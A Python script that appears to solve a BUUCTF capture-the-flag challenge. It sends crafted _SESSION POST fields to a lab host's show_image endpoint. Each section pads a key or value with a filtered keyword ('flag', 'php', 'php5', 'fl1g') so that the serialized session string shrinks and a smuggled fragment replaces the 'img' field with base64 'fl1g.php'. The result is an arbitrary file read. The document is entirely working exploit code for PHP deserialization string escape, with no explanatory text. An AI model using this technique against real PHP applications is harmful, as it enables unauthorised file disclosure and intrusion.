import requests
import time
import base64

URL = "http://4079c9cb-e2e3-4d7b-9bc1-a686b76e15a2.node5.buuoj.cn:81/"

session = requests.Session()

# Target file: fl1g.php
target = "fl1g.php"
target_b64 = base64.b64encode(target.encode()).decode()

print(f"Target: {target}, Base64: {target_b64}")

# 测试键名收缩
print("\n=== 测试键名收缩 ===")
inject = ';s:3:"img";s:9:"' + target_b64 + '";}'
for n in range(1, 30):
    key = "flag" * n
    data = {f"_SESSION[{key}]": inject}
    r = session.post(URL + "?f=show_image", data=data)
    time.sleep(0.3)
    if r.text and len(r.text) > 10:
        print(f"n={n}: {r.text[:200]}")
        if "flag{" in r.text.lower():
            print("SUCCESS!")
            break

# 测试值收缩（user）
print("\n=== 测试user值收缩 ===")
inject = '";s:3:"img";s:9:"' + target_b64 + '";}'
for n in range(1, 30):
    value = "flag" * n + inject
    data = {"_SESSION[user]": value}
    r = session.post(URL + "?f=show_image", data=data)
    time.sleep(0.3)
    if r.text and len(r.text) > 10:
        print(f"n={n}: {r.text[:200]}")
        if "flag{" in r.text.lower():
            print("SUCCESS!")
            break

# 测试值收缩（php）
print("\n=== 测试php值收缩 ===")
inject = '";s:3:"img";s:9:"' + target_b64 + '";}'
for n in range(1, 30):
    value = "php" * n + inject
    data = {"_SESSION[user]": value}
    r = session.post(URL + "?f=show_image", data=data)
    time.sleep(0.3)
    if r.text and len(r.text) > 10:
        print(f"n={n}: {r.text[:200]}")
        if "flag{" in r.text.lower():
            print("SUCCESS!")
            break

# 测试值收缩（php5）
print("\n=== 测试php5值收缩 ===")
inject = '";s:3:"img";s:9:"' + target_b64 + '";}'
for n in range(1, 30):
    value = "php5" * n + inject
    data = {"_SESSION[user]": value}
    r = session.post(URL + "?f=show_image", data=data)
    time.sleep(0.3)
    if r.text and len(r.text) > 10:
        print(f"n={n}: {r.text[:200]}")
        if "flag{" in r.text.lower():
            print("SUCCESS!")
            break

# 测试值收缩（fl1g）
print("\n=== 测试fl1g值收缩 ===")
inject = '";s:3:"img";s:9:"' + target_b64 + '";}'
for n in range(1, 30):
    value = "fl1g" * n + inject
    data = {"_SESSION[user]": value}
    r = session.post(URL + "?f=show_image", data=data)
    time.sleep(0.3)
    if r.text and len(r.text) > 10:
        print(f"n={n}: {r.text[:200]}")
        if "flag{" in r.text.lower():
            print("SUCCESS!")
            break

